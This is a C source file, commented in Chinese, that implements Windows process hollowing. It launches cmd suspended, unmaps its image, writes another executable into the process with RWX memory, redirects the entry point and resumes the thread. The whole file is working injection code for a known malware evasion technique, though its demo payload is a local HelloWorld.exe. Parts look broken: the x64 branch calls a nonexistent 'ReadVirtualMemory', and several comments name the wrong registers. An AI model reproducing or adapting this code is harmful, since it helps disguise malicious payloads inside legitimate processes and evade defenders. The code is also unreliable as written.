#include <stdio.h>
#include <Windows.h>



typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

int main(int argc, wchar_t* argv[])
{
	IN PIMAGE_DOS_HEADER pDosHeaders;
	IN PIMAGE_NT_HEADERS pNtHeaders;
	IN PIMAGE_SECTION_HEADER pSectionHeaders;

	IN PVOID FileImage;

	IN HANDLE hFile;
	OUT DWORD FileReadSize;
	IN DWORD dwFileSize;

	IN PVOID RemoteImageBase;
	IN PVOID RemoteProcessMemory;




	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	si.cb = sizeof(si);





	char path[] = "C:\\Users\\Black Sheep\\Desktop\\ProcessHollowing\\Debug\\HelloWorld.exe";
	BOOL bRet = CreateProcessA(
		NULL,
		(LPSTR)"cmd",
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		&si,
		&pi);

	//在本进程获取替换文件的内容
	hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	dwFileSize = GetFileSize(hFile, NULL); //获取替换可执行文件的大小
	FileImage = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	ReadFile(hFile, FileImage, dwFileSize, &FileReadSize, NULL);
	CloseHandle(hFile);

	pDosHeaders = (PIMAGE_DOS_HEADER)FileImage;
	pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileImage + pDosHeaders->e_lfanew); //获取NT头

	GetThreadContext(pi.hThread, &ctx); //获取挂起进程上下文

#ifdef _WIN64
	ReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &RemoteImageBase, sizeof(PVOID), NULL);
	// 从rbx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址
#endif
	// 从ebx寄存器中获取PEB地址，并从PEB中读取可执行映像的基址
#ifdef _X86_
	ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &RemoteImageBase, sizeof(PVOID), NULL);
#endif

	//判断文件预期加载地址是否被占用
	pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
	if ((SIZE_T)RemoteImageBase == pNtHeaders->OptionalHeader.ImageBase)
	{
		NtUnmapViewOfSection(pi.hProcess, RemoteImageBase); //卸载已存在文件
	}

	//为可执行映像分配内存,并写入文件头
	RemoteProcessMemory = VirtualAllocEx(pi.hProcess, (PVOID)pNtHeaders->OptionalHeader.ImageBase, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, RemoteProcessMemory, FileImage, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

	//逐段写入
	for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
	{
		pSectionHeaders = (PIMAGE_SECTION_HEADER)((LPBYTE)FileImage + pDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeaders->VirtualAddress), (PVOID)((LPBYTE)FileImage + pSectionHeaders->PointerToRawData), pSectionHeaders->SizeOfRawData, NULL);
	}

	//将rax寄存器设置为注入软件的入口点
#ifdef _WIN64
	ctx.Rcx = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
	WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
#endif

	//将eax寄存器设置为注入软件的入口点
#ifdef _X86_
	ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
	WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
#endif


	SetThreadContext(pi.hThread, &ctx); // 设置线程上下文
	ResumeThread(pi.hThread); // 恢复挂起线程

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return 0;
}